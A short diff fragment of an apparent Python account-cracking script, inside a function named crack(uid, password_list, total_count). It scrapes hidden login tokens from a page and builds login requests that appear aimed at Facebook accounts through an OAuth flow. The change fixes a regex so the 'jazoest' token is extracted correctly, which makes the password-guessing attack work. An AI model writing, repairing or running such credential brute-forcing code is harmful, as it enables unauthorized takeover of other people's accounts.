@@ -171,7 +171,7 @@ def crack(uid, password_list, total_count):
             "viewport-width": "980"}
             requu1 = Session.get(url1,headers=head)#  "#PWD_BROWSER:0:{}:{}".format(int(time.time()), pw),}   re.search('name="lsd" value="(.*?)"',str(requu1.text)).group(1),
             log_data = {
-            'jazoest': re.search('name="lsd" value="(.*?)"',str(requu1.text)).group(1),
+            'jazoest': re.search('name="jazoest" value="(.*?)"',str(requu1.text)).group(1),
             'lsd': re.search('name="lsd" value="(.*?)"',str(requu1.text)).group(1),
             'api_key': '525265914179580',
             'cancel_url': 'https://www.canva.com/oauth/authorized/facebook?error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied&state=f7539a58-1c26-48d2-835c-76d080298cae#_=_',
